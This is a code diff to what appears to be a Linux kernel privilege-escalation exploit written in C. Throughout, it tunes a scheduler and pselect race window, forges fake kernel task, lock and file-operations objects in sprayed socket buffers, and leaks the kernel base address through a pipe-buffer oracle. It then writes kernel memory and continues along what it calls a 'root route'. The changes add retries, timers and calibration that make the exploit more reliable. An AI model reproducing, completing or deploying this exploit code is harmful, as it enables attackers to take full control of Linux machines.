@@ -40,6 +40,10 @@ static atomic_int slide_consume_last_sched_ret;
 static atomic_int slide_consume_last_sched_errno;
 static atomic_int slide_consumer_ready;
 static atomic_int slide_pselect_write_window;
+/* The pselect route must stay blocked while sched_setattr_tid() runs, then
+ * leave the wait through a real readiness event.  The old path created an
+ * unarmed timerfd, so every run ended at timeout ret=0 despite sched_ok=1. */
+static int slide_pselect_wake_fd = -1;
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
 static atomic_uint_fast64_t slide_pselect_started_ns;
 static int slide_pselect_production_stack;
@@ -194,6 +198,14 @@ void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
   uintptr_t stack_pi_left = slide_oracle_target;
   uintptr_t stack_task = fake_task;
   slide_pselect_production_stack = 0;
+#if defined(APP_P0_GATE_PI_RIGHT) && APP_P0_GATE_PI_RIGHT && \
+    defined(P0_ORACLE_GATE_SLOT)
+  if (slide_oracle_target != 0 &&
+      slide_oracle_parent == p0_gate_page_struct) {
+    stack_pi_right = slide_oracle_target;
+    stack_pi_left = 0;
+  }
+#endif
 #if defined(APP_PRODUCTION_STACK_PI_RIGHT_ONLY) && \
     APP_PRODUCTION_STACK_PI_RIGHT_ONLY
   if (slide_oracle_parent == fake_fops &&
@@ -314,6 +326,27 @@ void open_slide_selected_fds(fd_set *in, fd_set *out, fd_set *ex, int read_fd) {
   }
 }
 
+static void slide_arm_pselect_wake(void) {
+  int fd = slide_pselect_wake_fd;
+  if (fd < 0) {
+    return;
+  }
+  struct itimerspec timer = {
+    .it_value = {
+#ifdef SLIDE_PSELECT_WAKE_USEC
+      .tv_sec = SLIDE_PSELECT_WAKE_USEC / 1000000,
+      .tv_nsec = (SLIDE_PSELECT_WAKE_USEC % 1000000) * 1000L,
+#else
+      .tv_sec = 0,
+      .tv_nsec = 1000000L,
+#endif
+    },
+  };
+  if (syscall(SYS_timerfd_settime, fd, 0, &timer, NULL) != 0) {
+    pr_warning("slide timerfd_settime failed errno=%d\n", errno);
+  }
+}
+
 void slide_pselect_stack_copy(void) {
   if (!page_base || !fake_lock || !fake_w0) {
     pr_error("slide pselect missing kernel page base=%016zx lock=%016zx w0=%016zx\n",
@@ -339,6 +372,8 @@ void slide_pselect_stack_copy(void) {
     close(pipefd[1]);
     return;
   }
+
+  slide_pselect_wake_fd = block_fd == pipefd[0] ? -1 : block_fd;
 
   fd_set in;
   fd_set out;
@@ -431,6 +466,7 @@ void slide_pselect_stack_copy(void) {
                ret > 0 && atomic_load(&slide_consume_sched_ok) > 0);
 
   close(high_read);
+  slide_pselect_wake_fd = -1;
   if (block_fd != pipefd[0]) {
     close(block_fd);
   }
@@ -624,10 +660,12 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
     int entered = atomic_load(&slide_consume_enter_sched) + 1;
     atomic_store(&slide_consume_enter_sched, entered);
     atomic_store(&slide_consume_calls, calls + 1);
+    slide_arm_pselect_wake();
     *errno_ptr = 0;
     long ret = sched_setattr_tid(tid, (calls % 19) + 1);
     int saved_errno = *errno_ptr;
-#if defined(SLIDE_SYNC_PSELECT_SYSCALL) && SLIDE_SYNC_PSELECT_SYSCALL
+#if defined(SLIDE_SYNC_PSELECT_SYSCALL) && SLIDE_SYNC_PSELECT_SYSCALL && \
+    defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
     pr_info("slide pselect blocked ready=%d ready_usec=%zu ready_wchan=%s "
             "guard=%d guard_usec=%zu guard_wchan=%s age_usec=%llu tid=%d\n",
             ready_ok, ready_elapsed_usec, ready_wchan,
@@ -910,6 +948,7 @@ static int slide_trigger_physical_state(void) {
 static const int slide_physical_slot_delays[] = {
   SLIDE_PHYSICAL_SLOT_DELAYS_USEC
 };
+static size_t slide_physical_delay_rotation;
 #endif
 
 static int slide_trigger_physical_slot(size_t slot) {
@@ -921,6 +960,7 @@ static int slide_trigger_physical_slot(size_t slot) {
 #if defined(SLIDE_PHYSICAL_SLOT_DELAYS_USEC)
   int attempts = (int)(sizeof(slide_physical_slot_delays) /
                        sizeof(slide_physical_slot_delays[0]));
+  size_t delay_start = slide_physical_delay_rotation++ % (size_t)attempts;
 #else
   int attempts = 1;
 #endif
@@ -928,7 +968,8 @@ static int slide_trigger_physical_slot(size_t slot) {
   for (int attempt = 1; attempt <= attempts; attempt++) {
     int delay = base_delay;
 #if defined(SLIDE_PHYSICAL_SLOT_DELAYS_USEC)
-    delay = slide_physical_slot_delays[(size_t)(attempt - 1)];
+    delay = slide_physical_slot_delays[
+        (delay_start + (size_t)(attempt - 1)) % (size_t)attempts];
 #endif
 #if defined(SLIDE_VIRTUAL_BASE_DELAY_USEC)
     if (p0_virtual_base_probe) {
@@ -951,6 +992,31 @@ static int slide_trigger_physical_slot(size_t slot) {
 
   pr_error("p0 physical slot=%zu write window failed after %d attempt(s)\n",
            slot, attempts);
+  return 0;
+}
+
+static int slide_trigger_and_verify_p0_gate(void) {
+  int attempts = 1;
+#ifdef APP_P0_GATE_RETRY_ATTEMPTS
+  attempts = APP_P0_GATE_RETRY_ATTEMPTS;
+#endif
+  for (int attempt = 1; attempt <= attempts; attempt++) {
+    /* Mark the shared supervisor state before the first physical trigger.
+     * Any child that reaches this point is no longer eligible for a retry,
+     * even if the trigger itself returns an error. */
+    app_publish_p0_dirty();
+    if (!slide_trigger_physical_slot(P0_ORACLE_GATE_SLOT)) {
+      pr_warning("p0 physical gate trigger failed retry=%d/%d\n",
+                 attempt, attempts);
+      return 0;
+    }
+    int gate_result = verify_p0_pipe_oracle_gate();
+    pr_info("p0 physical gate verification retry=%d/%d result=%d\n",
+            attempt, attempts, gate_result);
+    if (gate_result != 0) {
+      return gate_result;
+    }
+  }
   return 0;
 }
 
@@ -1060,6 +1126,95 @@ int app_trigger_fops_slide_route(void) {
 
 static int slide_leak_physical_base(void) {
   size_t started = gettime_ns();
+#if defined(APP_P0_PREPARE_ONLY) && APP_P0_PREPARE_ONLY
+#if defined(APP_P0_PREPARE_P0_ONLY) && APP_P0_PREPARE_P0_ONLY
+  /* Keep the diagnostic probe in the root binary so its allocator/layout
+   * matches the clean P0-only calibration run.  The probe-only stop is
+   * runtime-selectable and is used only for non-destructive calibration. */
+#if defined(APP_P0_PROBE_ONLY_COMPILETIME) && APP_P0_PROBE_ONLY_COMPILETIME
+  const int p0_probe_only = 1;
+#else
+  const int p0_probe_only = getenv("P0_PROBE_ONLY") != NULL;
+#endif
+  if (p0_probe_only) {
+    pr_warning("p0 prepare-only pipe probe; physical gate/write remains disabled\n");
+    if (!prepare_p0_pipe_oracle()) {
+      pr_error("p0 prepare-only pipe preparation failed\n");
+      return 0;
+    }
+    pr_info("p0 prepare-only pipe=ready base=%016zx\n", pipebuf_page_base);
+    return 0;
+  }
+#endif
+#if defined(APP_P0_PREPARE_DIAGNOSTIC) && APP_P0_PREPARE_DIAGNOSTIC
+  pr_warning("p0 prepare diagnostic begin; physical gate/write remains disabled\n");
+  if (!prepare_p0_pipe_oracle()) {
+    pr_error("p0 prepare diagnostic pipe preparation failed\n");
+    return 0;
+  }
+  pr_info("p0 prepare diagnostic pipe=ready base=%016zx\n",
+          pipebuf_page_base);
+#if defined(APP_P0_TO_KERNEL_COOLDOWN_USEC) && \
+    APP_P0_TO_KERNEL_COOLDOWN_USEC > 0
+  pr_info("p0-to-kernel cooldown usec=%d\n",
+          APP_P0_TO_KERNEL_COOLDOWN_USEC);
+  usleep(APP_P0_TO_KERNEL_COOLDOWN_USEC);
+#endif
+  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
+  pr_info("p0 prepare diagnostic kernel_page=%016zx elapsed_ms=%zu\n",
+          page_base,
+          (size_t)((gettime_ns() - started) / 1000000ULL));
+#if defined(APP_P0_DIAGNOSTIC_THEN_ROOT) && APP_P0_DIAGNOSTIC_THEN_ROOT
+  if (!page_base) {
+    reset_pipe_attempt();
+    return 0;
+  }
+  pr_warning("p0 diagnostic passed; continuing with one physical root route\n");
+  int gate_result = slide_trigger_and_verify_p0_gate();
+  pr_info("p0 diagnostic root gate result=%d\n", gate_result);
+  if (gate_result == 0) {
+    /* A clean gate miss is a terminal miss for this fresh session.  Tear down
+     * the reference keeper and holder pipes before returning so the preload
+     * supervisor can observe the child exit instead of waiting on orphaned
+     * P0 state. */
+    reset_pipe_attempt();
+    return 0;
+  }
+  app_publish_p0_dirty();
+  if (gate_result < 0) {
+    slide_restore_physical_oracle();
+    reset_pipe_attempt();
+    return 0;
+  }
+  if (!slide_trigger_physical_slot(P0_ORACLE_PROBE_SLOT)) {
+    slide_restore_physical_oracle();
+    reset_pipe_attempt();
+    return 0;
+  }
+  uintptr_t offset = scan_p0_pipe_oracle();
+  if (offset == (uintptr_t)-1 || !slide_restore_physical_oracle()) {
+    slide_restore_physical_oracle();
+    reset_pipe_attempt();
+    return 0;
+  }
+  slide_p0_session_fresh = 1;
+  pr_success("p0 diagnostic root physical offset=%08zx elapsed_ms=%zu\n",
+             offset,
+             (size_t)((gettime_ns() - started) / 1000000ULL));
+  return slide_commit_stext(KIMAGE_TEXT_BASE + offset, "physical");
+#else
+  pr_warning("p0 prepare diagnostic stop before gate trigger, probe, restore, and physical write\n");
+  return 0;
+#endif
+#else
+  pr_warning("p0 safe circuit breaker active; skipping kernel page preparation and physical writes\n");
+  return 0;
+#endif
+#endif
+#if defined(APP_P0_PHYSICAL_WRITE_ARMED) && !APP_P0_PHYSICAL_WRITE_ARMED
+  pr_warning("p0 physical write arm is disabled; stopping before gate/write\n");
+  return 0;
+#endif
   if (!prepare_p0_pipe_oracle()) {
     pr_error("p0 physical pipe preparation failed\n");
     return 0;
@@ -1108,14 +1263,7 @@ static int slide_leak_physical_base(void) {
 #endif
       continue;
     }
-    if (!slide_trigger_physical_slot(P0_ORACLE_GATE_SLOT)) {
-      pr_error("p0 physical pipe gate trigger failed fresh=%d/%d\n",
-               fresh_attempt, fresh_page_attempts);
-      fresh_attempt++;
-      refresh_oracle = 1;
-      continue;
-    }
-    int gate_result = verify_p0_pipe_oracle_gate();
+    int gate_result = slide_trigger_and_verify_p0_gate();
     pr_info("p0 fresh page result=%d attempt=%d/%d\n",
             gate_result, fresh_attempt, fresh_page_attempts);
     if (getenv("P0_ORACLE_GATE_DIAG")) {
@@ -1178,11 +1326,7 @@ static int slide_leak_physical_base(void) {
   if (!page_base) {
     return 0;
   }
-  if (!slide_trigger_physical_slot(P0_ORACLE_GATE_SLOT)) {
-    pr_error("p0 physical pipe gate trigger failed\n");
-    return 0;
-  }
-  int gate_result = verify_p0_pipe_oracle_gate();
+  int gate_result = slide_trigger_and_verify_p0_gate();
   if (getenv("P0_ORACLE_GATE_DIAG")) {
     pr_info("p0 physical gate diagnostic result=%d\n", gate_result);
     if (gate_result != 0) {
@@ -1349,10 +1493,20 @@ static int prepare_p0_diag_waiter(int fd, uintptr_t waiter,
 }
 
 static int prepare_p0_diag_gate_payload(int fd, uintptr_t payload_base) {
+  /* prepare_skb_payload() stores the slide bank at base+SKB_DATA_DELTA.
+   * Runtime repair must update that same bank; using page_base directly puts
+   * the fake lock/task one page away from the entries selected by slot 0. */
+  uintptr_t source_page_base = page_base;
+  /* Keep this expression tied to the target profile.  The payload builder
+   * uses base+SKB_DATA_DELTA; duplicating a target-specific literal here can
+   * silently put the repaired lock/task bank at a different address. */
+  uintptr_t prepared_payload_base =
+      (uintptr_t)((intptr_t)source_page_base + (intptr_t)SKB_DATA_DELTA);
+  payload_base = prepared_payload_base;
   uintptr_t task = payload_base + SLIDE_BANK_TASK_OFF;
   uintptr_t lock = payload_base + SLIDE_BANK_LOCK_OFF;
   uintptr_t waiter = lock + SLIDE_BANK_WAITER_OFF;
-  uintptr_t parent = direct_to_page(payload_base);
+  uintptr_t parent = direct_to_page(source_page_base);
   uintptr_t target = pipebuf_page_base +
                      P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE;
   static const char marker[] = "RMG-P0-ORACLE-GATE";
@@ -1360,6 +1514,11 @@ static int prepare_p0_diag_gate_payload(int fd, uintptr_t payload_base) {
   if (getenv("P0_ORACLE_READ_DIAG")) {
     marker_address = payload_base;
   }
+
+  pr_info("p0 diagnostic bank source=%016zx payload=%016zx marker=%016zx "
+          "task=%016zx lock=%016zx waiter=%016zx parent=%016zx target=%016zx\n",
+          source_page_base, payload_base, marker_address, task, lock,
+          waiter, parent, target);
 
   if (kernel_write_data(fd, marker_address, marker, sizeof(marker) - 1) !=
           (ssize_t)(sizeof(marker) - 1) ||
